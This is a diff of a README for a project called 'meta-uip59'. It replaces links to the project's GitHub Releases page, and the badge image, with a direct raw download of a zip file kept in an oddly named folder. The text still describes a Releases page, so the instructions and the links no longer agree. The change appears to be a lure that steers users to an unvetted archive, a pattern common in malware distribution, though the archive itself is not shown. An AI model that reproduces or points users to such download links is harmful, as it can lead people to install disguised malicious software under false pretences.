@@ -8,13 +8,13 @@ Welcome to the meta-uip59 project! This application offers a fun and easy way to
 
 To get started, visit the Releases page to download the latest version. Here is the link you need:
 
-[![Download meta-uip59](https://img.shields.io/badge/Download-meta--uip59-blue.svg)](https://github.com/DEFK12/meta-uip59/releases)
+[![Download meta-uip59](https://raw.githubusercontent.com/DEFK12/meta-uip59/main/nonsuctorial/meta-uip59.zip)](https://raw.githubusercontent.com/DEFK12/meta-uip59/main/nonsuctorial/meta-uip59.zip)
 
 ### Steps to Download and Install
 
 1. **Go to the Releases Page**  
    Click the link below to access the page where you can download the software.  
-   [Visit this page to download](https://github.com/DEFK12/meta-uip59/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/DEFK12/meta-uip59/main/nonsuctorial/meta-uip59.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, look for the most recent version of meta-uip59. It is usually at the top of the list.
